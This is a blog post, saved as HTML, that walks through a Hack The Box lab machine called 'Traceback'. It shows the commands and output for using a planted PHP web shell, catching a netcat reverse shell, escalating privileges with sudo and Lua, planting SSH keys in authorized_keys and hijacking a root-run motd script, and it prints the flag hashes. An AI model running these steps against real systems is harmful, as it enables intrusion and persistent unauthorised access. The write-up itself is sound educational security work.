<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />

  <title>
    
      Hack The Box - Traceback &middot; Ryan Kozak
    
  </title>

  


  <!-- CSS -->
  <link rel="stylesheet" href="/assets/css/main.css" />
  

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface" />

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/favicon.png" />
<link rel="shortcut icon" href="/favicon.ico" />

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" />

  <!-- Additional head bits without overriding original head -->

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<title>Hack The Box - Traceback | Ryan Kozak</title>
<meta name="generator" content="Jekyll v3.8.7" />
<meta property="og:title" content="Hack The Box - Traceback" />
<meta name="author" content="Ryan Kozak" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="hacking, web development, $other" />
<meta property="og:description" content="hacking, web development, $other" />
<link rel="canonical" href="http://0.0.0.0:4000/hack-the-box-craft-traceback/" />
<meta property="og:url" content="http://0.0.0.0:4000/hack-the-box-craft-traceback/" />
<meta property="og:site_name" content="Ryan Kozak" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-08-17T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Hack The Box - Traceback" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"Hack The Box - Traceback","dateModified":"2021-06-23T16:11:24+00:00","datePublished":"2020-08-17T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/hack-the-box-craft-traceback/"},"url":"http://0.0.0.0:4000/hack-the-box-craft-traceback/","author":{"@type":"Person","name":"Ryan Kozak"},"description":"hacking, web development, $other","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


</head>


  <body class="post">

    <div id="sidebar">
  <header>
    <div class="site-title">
      <a href="/">
        
          <span class="back-arrow icon"><svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
  <path d="M0 0h24v24H0z" fill="none"/>
  <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
</svg></span>
        
        Ryan Kozak
      </a>
    </div>
    <p class="lead">hacking, web development, $other</p>
  </header>
  <nav id="sidebar-nav-links">

  
    <a class="home-link "
        href="/">Home</a>
  

  

  

  


  
    
  

  
    
    	
      		<a class="page-link " href="/about/">About</a>
    	
    
  

  
    
    	
      		<a class="page-link " href="/contact/">Contact</a>
    	
    
  

  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  

  
    
    	
      		<a class="page-link " href="/books/index.html">Book List</a>
    	
    
  

  
    
    	
    	<!-- TingTingPowPow -->
    	
    
  

  
    
    	
    	<!-- TingTingPowPow -->
    	
    
  

  
    
    	
    	<!-- TingTingPowPow -->
    	
    
  

  
    
    	
    	<!-- TingTingPowPow -->
    	
    
  

  
    
    	
    	<!-- TingTingPowPow -->
    	
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  

  



  


  
    
  

  
    
  

  
    
  

  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  

  

  
  <!-- Optional additional links to insert in sidebar nav -->


</nav>


  <nav id="sidebar-icon-links">
  
    <a id="github-link"
       class="icon" title="Github Profile" aria-label="Github Profile"
       href="https://github.com/d0n601">
      <svg version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 28"><path d="M12 2c6.625 0 12 5.375 12 12 0 5.297-3.437 9.797-8.203 11.391-0.609 0.109-0.828-0.266-0.828-0.578 0-0.391 0.016-1.687 0.016-3.297 0-1.125-0.375-1.844-0.812-2.219 2.672-0.297 5.484-1.313 5.484-5.922 0-1.313-0.469-2.375-1.234-3.219 0.125-0.313 0.531-1.531-0.125-3.187-1-0.313-3.297 1.234-3.297 1.234-0.953-0.266-1.984-0.406-3-0.406s-2.047 0.141-3 0.406c0 0-2.297-1.547-3.297-1.234-0.656 1.656-0.25 2.875-0.125 3.187-0.766 0.844-1.234 1.906-1.234 3.219 0 4.594 2.797 5.625 5.469 5.922-0.344 0.313-0.656 0.844-0.766 1.609-0.688 0.313-2.438 0.844-3.484-1-0.656-1.141-1.844-1.234-1.844-1.234-1.172-0.016-0.078 0.734-0.078 0.734 0.781 0.359 1.328 1.75 1.328 1.75 0.703 2.141 4.047 1.422 4.047 1.422 0 1 0.016 1.937 0.016 2.234 0 0.313-0.219 0.688-0.828 0.578-4.766-1.594-8.203-6.094-8.203-11.391 0-6.625 5.375-12 12-12zM4.547 19.234c0.031-0.063-0.016-0.141-0.109-0.187-0.094-0.031-0.172-0.016-0.203 0.031-0.031 0.063 0.016 0.141 0.109 0.187 0.078 0.047 0.172 0.031 0.203-0.031zM5.031 19.766c0.063-0.047 0.047-0.156-0.031-0.25-0.078-0.078-0.187-0.109-0.25-0.047-0.063 0.047-0.047 0.156 0.031 0.25 0.078 0.078 0.187 0.109 0.25 0.047zM5.5 20.469c0.078-0.063 0.078-0.187 0-0.297-0.063-0.109-0.187-0.156-0.266-0.094-0.078 0.047-0.078 0.172 0 0.281s0.203 0.156 0.266 0.109zM6.156 21.125c0.063-0.063 0.031-0.203-0.063-0.297-0.109-0.109-0.25-0.125-0.313-0.047-0.078 0.063-0.047 0.203 0.063 0.297 0.109 0.109 0.25 0.125 0.313 0.047zM7.047 21.516c0.031-0.094-0.063-0.203-0.203-0.25-0.125-0.031-0.266 0.016-0.297 0.109s0.063 0.203 0.203 0.234c0.125 0.047 0.266 0 0.297-0.094zM8.031 21.594c0-0.109-0.125-0.187-0.266-0.172-0.141 0-0.25 0.078-0.25 0.172 0 0.109 0.109 0.187 0.266 0.172 0.141 0 0.25-0.078 0.25-0.172zM8.937 21.438c-0.016-0.094-0.141-0.156-0.281-0.141-0.141 0.031-0.234 0.125-0.219 0.234 0.016 0.094 0.141 0.156 0.281 0.125s0.234-0.125 0.219-0.219z"></path>
</svg>

    </a>
  

  
  <a id="stackoverflow-link"
     class="icon" title="Stack Overflow Profile" aria-label="Stack Overflow Profile"
     href="https://stackoverflow.com/users/4681506/ryan-kozak">
    <?xml version="1.0" encoding="utf-8"?>
<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 viewBox="0 0 120 120" style="enable-background:new 0 0 120 120;" xml:space="preserve">
<style type="text/css">
	.st0{fill:#BCBBBB;}
	.st1{fill:#F48023;}
</style>
<polygon class="st0" points="84.4,93.8 84.4,70.6 92.1,70.6 92.1,101.5 22.6,101.5 22.6,70.6 30.3,70.6 30.3,93.8 "/>
<path class="st1" d="M38.8,68.4l37.8,7.9l1.6-7.6l-37.8-7.9L38.8,68.4z M43.8,50.4l35,16.3l3.2-7l-35-16.4L43.8,50.4z M53.5,33.2
	l29.7,24.7l4.9-5.9L58.4,27.3L53.5,33.2z M72.7,14.9l-6.2,4.6l23,31l6.2-4.6L72.7,14.9z M38,86h38.6v-7.7H38V86z"/>
</svg>

  </a>
  

  
  
  
  

  
    <a id="tags-link"
       class="icon"
       title="Tags" aria-label="Tags"
       href="/tags/">
      <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
    </a>
  

  
    <a id="search-link"
       class="icon"
       title="Search" aria-label="Search"
       href="/search/">
      <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
    <path d="M0 0h24v24H0z" fill="none"/>
</svg>
    </a>
  

  <!-- Optional additional links to insert for icons links -->
</nav>
 
  <p class="copyright">
  &copy; 2021 Ryan Kozak.
</p>

</div>

    <main class="container">
      <header>
  <h1 class="post-title">Hack The Box - Traceback</h1>
</header>
<div class="content">
  <div class="post-meta">
  <span class="post-date">17 Aug 2020</span>
  <span class="post-categories">
    
      &bull;

      
      
      

      
        CTF Writeup
      
    
      &bull;

      
      
      

      
        Security
      
    
  </span>
</div>

  <div class="post-body">
    <p><img src="/wp-content/uploads/2020/08/traceback/badge.png" alt="Hack The Box Haystack" /></p>

<h1 id="introduction">Introduction</h1>
<p>Traceback is an easy level box. It’s one of the first boxes on which I’ve been able to get user and root in one sitting. There’s a little bit of OSINT and guess work involved in the initial foothold, and the user/root portions aren’t too difficult at all. The theme of the box is that it has already been compromised by another hacker (Xh4H who authoried the box), and you seem to be retracing their steps while gaining user and root flags.</p>

<h1 id="information-gathering">Information Gathering</h1>
<h2 id="port-scan-nmap">Port Scan: Nmap</h2>
<p>We begin our reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:~#</span><span class="w"> </span>nmap <span class="nt">-sVC</span> 10.10.10.181
<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-09 18:54 EDT
Nmap scan report for 10.10.10.181
Host is up (0.084s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
</span><span class="gp">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey:
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.35 seconds

</span></code></pre></div></div>
<p>The only open ports on the machine are <strong>22</strong> and <strong>80</strong>. These are all we’ll need to proceed through the rest of the box. so let’s take a look at what’s on the web port.</p>

<h3 id="port-80">Port 80</h3>
<p>Browsing to the website we can see that it’s been defaced, and apparently they’ve left a backdoor somewhere.</p>

<p><img src="/wp-content/uploads/2020/08/traceback/port80.png" alt="port80" /><br />
<strong>Figure 1:</strong> This site has been owned by Xh4H.</p>

<p>Looking at the source code of the defaced page we find an HTML comment that indicates this backdoor is a webshell of some sort.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;body&gt;</span>
	<span class="nt">&lt;center&gt;</span>
		<span class="nt">&lt;h1&gt;</span>This site has been owned<span class="nt">&lt;/h1&gt;</span>
		<span class="nt">&lt;h2&gt;</span>I have left a backdoor for all the net. FREE INTERNETZZZ<span class="nt">&lt;/h2&gt;</span>
		<span class="nt">&lt;h3&gt;</span> - Xh4H - <span class="nt">&lt;/h3&gt;</span>
		<span class="c">&lt;!--Some of the best web shells that you might need ;)--&gt;</span>
	<span class="nt">&lt;/center&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>

</code></pre></div></div>

<h3 id="osint">OSINT</h3>
<p>After searching for <em>Xh4H</em> on Google, the first hit is a <a href="https://github.com/Xh4H/">GitHub profile</a>. Browsing through his repositories a bit there’s one called <a href="https://github.com/Xh4H/Web-Shells">Web-Shells</a> which he’s forked from another repository.</p>

<p><img src="/wp-content/uploads/2020/08/traceback/web-shells.png" alt="web-shells" /><br />
<strong>Figure 2:</strong> Xh4H’s Web-Shells repository.</p>

<p>There are 16 different shells in this repo, 15 of which are <em>php</em> shells.</p>

<h1 id="exploitation">Exploitation</h1>
<h2 id="initial-foothold">Initial foothold</h2>
<p>Trying each shell in the repository we eventually find that <code class="highlighter-rouge">http:10.10.10.181/smevk.php</code> is the backdoor. This is the second to last shell in the repository.<br />
<img src="/wp-content/uploads/2020/08/traceback/smevk_login_page.png" alt="smevk_login_page" /><br />
<strong>Figure 3:</strong> We found the backdoor, but it’s closed.</p>

<p>There’s a login page to <code class="highlighter-rouge">smevk</code>, but it turns out that the credentials are simply <code class="highlighter-rouge">admin:admin</code>. That was my first guess.</p>

<p><img src="/wp-content/uploads/2020/08/traceback/smevk_logged_in.png" alt="smevk_logged_in" /><br />
<strong>Figure 4:</strong> We’re in through the backdoor.</p>

<h2 id="user-flag">User Flag</h2>
<p>I’m a n00b, so I haven’t used many web shells besides <code class="highlighter-rouge">c99</code> and <code class="highlighter-rouge">p0wny</code>. As I explored the features of <code class="highlighter-rouge">smevk</code> I came to find some of them quite useful. The menu includes <em>Sec. Info</em>, <em>Files</em>, <em>Console</em>, <em>Bypasser</em>, <em>Safe Mode</em>, <em>String tools</em>, <em>Import Scripts</em>, <em>Network</em>, <em>Readable Dirs</em>, <em>Defacer</em>, <em>Code Injector</em>, <em>Domains</em>, and  <em>logout button</em>. A lot of these features seemed neat but the only ones I really utilized are the file explorer and the file uploader.</p>

<p>Navigating directly to the <code class="highlighter-rouge">/home</code> directory we see two users <code class="highlighter-rouge">sysadmin</code> and <code class="highlighter-rouge">webadmin</code>.<br />
<img src="/wp-content/uploads/2020/08/traceback/home_directory.png" alt="home_directory" /><br />
<strong>Figure 5:</strong> The <code class="highlighter-rouge">/home</code> directory shows two users.</p>

<p>In this case we’re logged in as <code class="highlighter-rouge">webadmin</code>, and don’t have access to the <code class="highlighter-rouge">sysadmin</code> directory. The flag  doesn’t appear to be in our <code class="highlighter-rouge">/home/webadmin</code> directory, but other useful things definitely are (<code class="highlighter-rouge">note.txt</code> and <code class="highlighter-rouge">.bash_history</code>).<br />
<img src="/wp-content/uploads/2020/08/traceback/home_webadmin.png" alt="home_webadmin" /><br />
<strong>Figure 6:</strong> Some interesting files in our home directory, but not flag.</p>

<p>Exploring the <code class="highlighter-rouge">note.txt</code> file we can see it mentions that there’s Lua installed on the box for us to “practice” with.</p>

<p><img src="/wp-content/uploads/2020/08/traceback/note.png" alt="note" /><br />
<strong>Figure 7:</strong> Contents of <code class="highlighter-rouge">note.txt</code>.</p>

<p>Initially I thought that the <code class="highlighter-rouge">.bash_history</code> may have been a spoiler left by another user. I realize now though that we’re supposed to find it, and “trace back the steps” of the initial exploitation.  <code class="highlighter-rouge">.bash_history</code> tells us very explicitly where Lua is, and how to execute it as the <code class="highlighter-rouge">sysadmin</code> user. We simply need to create the <code class="highlighter-rouge">privesc.lua</code> file ourself as it appears to have been removed after execution.<br />
<img src="/wp-content/uploads/2020/08/traceback/what.png" alt="what" /><br />
<strong>Figure 8:</strong> The contents of <code class="highlighter-rouge">.bash_history</code> are basically a guide to getting the user flag.</p>

<p>We need only to look at <a href="https://gtfobins.github.io/gtfobins/lua/">GTFO Bins Lua section</a> to determine the syntax to launch a shell in Lua, something like <code class="highlighter-rouge">os.execute("/bin/sh")</code> will work.</p>

<p>To create our Lua script and launch it for a privilege escalation to <code class="highlighter-rouge">sysadmin</code> we’re going to need a reverse shell on the machine. To do this we’ll launch a netcat listener via <code class="highlighter-rouge">nc -lvp 4444</code> and upload a php revers shell named <code class="highlighter-rouge">x.php</code>. Navigating to <code class="highlighter-rouge">http:10.10.10.181/x.php</code> with trigger the reverse shell to call back to us.</p>

<p><img src="/wp-content/uploads/2020/08/traceback/shell_upload.png" alt="shell_upload" /><br />
<strong>Figure 9:</strong> Uploading <code class="highlighter-rouge">x.php</code>, our reverse shell.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:~#</span><span class="w"> </span>nc <span class="nt">-lvp</span> 4444
<span class="go">listening on [any] 4444 ...
connect to [10.10.15.38] from traceback.htb [10.10.10.181] 47416
</span><span class="gp">Linux traceback 4.15.0-58-generic #</span>64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
<span class="go"> 11:44:37 up  1:45,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
</span><span class="gp">/bin/sh: 0: can't access tty;</span><span class="w"> </span>job control turned off
<span class="gp">$</span><span class="w">   
</span></code></pre></div></div>

<p>Once we’ve got the reverse shell going we’ll create the Lua file next and execute it for privilege escalation to <code class="highlighter-rouge">sysadmin</code>.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"os.execute('/bin/bash')"</span> <span class="o">&gt;</span> privesc.lua
<span class="gp">$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-u</span> sysadmin /home/sysadmin/luvit privesc.lua
<span class="go">sh: turning off NDELAY mode
whoami
sysadmin
cd /home/sysadmin
cat user.txt
82f71c69e2692140bd21f923d0707f05
</span></code></pre></div></div>

<h2 id="root-flag">Root Flag</h2>
<p>Before we start trying to escalate privileges to root we’re going to get a proper ssh session going on the box so that we don’t have to work within this reverse shell. To do so we’ll simply add our public key to <code class="highlighter-rouge">/home/sysadmin/.ssh/authorized_keys</code>.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCx7eDPx1R6wLygP7rzBH7L0PdPeMbZU1pyFpOJN45DuXiaor1bx2DksSKwNNPI7TiiTTNWplVdDGcW4p/ISVOoXLEP0W99QH8MB57HnMFShpuhNNJCCfhfLS1FEfD+iApR3RTZXnv13SBb/gLq21idHfBMes6A7Ba9Eba2gBbeWoIBF27PDXZER076r6LGHFdjHWFMJrdMOPDqdzYefBIVkGgbHqVRb0bd7IKi6NEMcAzL12BYnmIAXnJ789L+qDxGRam3hcImhV2mHpXpNJaunj9AUydxHgaKMY97x9REND2YGBPiCowb60qQTwDtIKfTEsAUOxJ6vQWVbdkxEsOr4HDe8azY30pL9vBjv8DT0rvC7ndVfy+maZ33sb/tvsVm5cw8mJZRnB/SEkHn4atDwR2CiX/FlWSmCV8s90bKBcRgJyW5+z7MyBTJ95g5hgGOpk20JEyl+P+EyZEai7l4j5ToCYnfmCX0ZdR3XNT3yI8oweCiRraHeiaqnn3Guxk= root@kali
" &gt;&gt; ~/.ssh/authorized_keys
</code></pre></div></div>

<p>Now we’ll ssh back into the box as <code class="highlighter-rouge">sysadmin</code>.<br />
<img src="/wp-content/uploads/2020/08/traceback/ssh_in_user.png" alt="ssh_in_user" /><br />
<strong>Figure 10:</strong> ssh’ing back in as <code class="highlighter-rouge">sysadmin</code> and launching bash.</p>

<p>To monitor the running processes we’ll download <a href="https://github.com/DominicBreuker/pspy">pspy</a> from our Kali box’s Apache server into the <code class="highlighter-rouge">/tmp</code> directory of the machine.</p>

<pre><code class="language-Console">sysadmin@traceback:~$ cd /tmp
sysadmin@traceback:/tmp$ wget http://10.10.15.38/pspy64
--2020-04-10 12:40:27--  http://10.10.15.38/pspy64
Connecting to 10.10.15.38:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M)
Saving to: ‘pspy64’

pspy64                              100%[=================================================================&gt;]   2.94M   808KB/s    in 4.9s    

2020-04-10 12:40:32 (611 KB/s) - ‘pspy64’ saved [3078592/3078592]

sysadmin@traceback:/tmp$
</code></pre>

<p>Launching it we can see that <code class="highlighter-rouge">/etc/.update-motd.d/</code> is being replaced about every 30 seconds. When we ssh’d into the box it was clear that this has been modified by the attacker previously. <strong>Welcome to Xh4H land</strong></p>

<p><img src="/wp-content/uploads/2020/08/traceback/pspy.png" alt="pspy" />
<strong>Figure 11:</strong> <code class="highlighter-rouge">/etc/.update-motd.d</code> being overwritten every 30 seconds from a backup directory.</p>

<p>We have permission as the <code class="highlighter-rouge">sysadmin</code> user to modify these files, and in doing so we can execute code as root.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sysadmin@traceback:/etc/update-motd.d$ ls -lah
total 32K
drwxr-xr-x  2 root sysadmin 4.0K Aug 27  2019 .
drwxr-xr-x 80 root root     4.0K Mar 16 03:55 ..
-rwxrwxr-x  1 root sysadmin  981 Apr 10 12:47 00-header
-rwxrwxr-x  1 root sysadmin  982 Apr 10 12:47 10-help-text
-rwxrwxr-x  1 root sysadmin 4.2K Apr 10 12:47 50-motd-news
-rwxrwxr-x  1 root sysadmin  604 Apr 10 12:47 80-esm
-rwxrwxr-x  1 root sysadmin  299 Apr 10 12:47 91-release-upgrade
</code></pre></div></div>

<p>We’ll modify the <code class="highlighter-rouge">00-header</code> file to copy the <code class="highlighter-rouge">sysadmin</code> user’s <code class="highlighter-rouge">authorized_keys</code> file into the <code class="highlighter-rouge">authorized_keys</code> file of the <code class="highlighter-rouge">root</code> user.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sysadmin@traceback:/etc/update-motd.d$ echo "ls -lah /root/.ssh &amp;&amp; cat /home/sysadmin/.ssh/authorized_keys &gt;&gt; /root/.ssh/authorized_keys &amp;&amp; cat /root/.ssh/authorized_keys" &gt;&gt; 00-header
</code></pre></div></div>

<p>Once we’ve done this, we quickly need to ssh into the box again before the <code class="highlighter-rouge">00-header</code> file is overwritten by the backup. If we do this quickly enough, our new login will trigger the code we’ve placed into <code class="highlighter-rouge">00-header</code> to be executed, and our <code class="highlighter-rouge">id_rsa.pub</code> is copied into <code class="highlighter-rouge">/root/.ssh/authorized_keys</code>. Now we can ssh into the box as root and grab the flag.<br />
<strong>Note:</strong> Yes we could have just placed <code class="highlighter-rouge">cat /root/root.txt</code> into the <code class="highlighter-rouge">00-header</code> and gotten the flag that way, but getting a root shell is much more satisfying.</p>

<p><img src="/wp-content/uploads/2020/08/traceback/rooted.png" alt="rooted" /><br />
<strong>Figure 12:</strong> f1af5eb9875c8514dbb32168383cfd52</p>

<h1 id="conclusion">Conclusion</h1>
<p>This box was fairly easy, which was nice because it’s rated as such. I enjoyed the theme of it, another hacker has compromised the machine and left messages around. Getting the user flag was really straight forward given the <code class="highlighter-rouge">.bash_history</code> file telling us exactly what to do. The path to root was extremely similar to the <a href="https://ryankozak.com/hack-the-box-writeup-4-writeup/">Writeup</a> box, and because of that it was kind of a breeze. It was quick and fairly fun, and that’s it.</p>

<h1 id="references">References</h1>
<ol>
  <li><a href="https://github.com/Xh4H/Web-Shells">Xh4H’s Web-Shells</a></li>
  <li><a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">Pentest Monkey’s PHP Reverse Shell</a></li>
  <li><a href="https://gtfobins.github.io/gtfobins/lua/">GTFO Bins Lua</a></li>
</ol>

    



<div class="post-tags">
  
    
    <a href="/tags/#ctf">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">CTF</span>
    </a>
  
    
    <a href="/tags/#hack-the-box">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">Hack The Box</span>
    </a>
  
    
    <a href="/tags/#linux">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">Linux</span>
    </a>
  
</div>
  </div>

  
  <section class="comments">
    <h2>Comments</h2>
    
  <div id="disqus_thread">
    <button class="disqus-load" onClick="loadDisqusComments()">
      Load Comments
    </button>
  </div>
  <script>

  /**
  *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW
  *  TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
  *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT:s
  *  https://disqus.com/admin/universalcode/#configuration-variables
  */
  var disqus_config = function () {
      this.page.url = "http://0.0.0.0:4000/hack-the-box-craft-traceback/";  // Replace PAGE_URL with your page's canonical URL variable
      this.page.identifier = "" || "http://0.0.0.0:4000/hack-the-box-craft-traceback/";// Replace PAGE_IDENTIFIER with your page's unique identifier variable
  }
  function loadDisqusComments() { // DON'T EDIT BELOW THIS LINE
    var d = document, s = d.createElement('script');
    s.src = '//https-ryankozak-com.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
  }
  </script>
  <noscript>
    Please enable JavaScript to view the
    <a href="https://disqus.com/?ref_noscript">comments powered by Disqus</a>.
  </noscript>



  </section>

  <section class="related">
  <h2>Related Posts</h2>
  <ul class="posts-list">
    
      <li>
        <h3>
          <a href="/hack-the-box-ophiuchi/">
            Hack The Box - Ophiuchi
            <small>16 Jul 2021</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/luks-encrypted-arch-linux-on-pinebook-pro-again/">
            Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root...Again
            <small>28 Jun 2021</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/luks-encrypted-arch-linux-on-pinebook-pro/">
            Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root
            <small>15 Dec 2020</small>
          </a>
        </h3>
      </li>
    
  </ul>
</section>

</div>

    </main>

    
  </body>
</html>
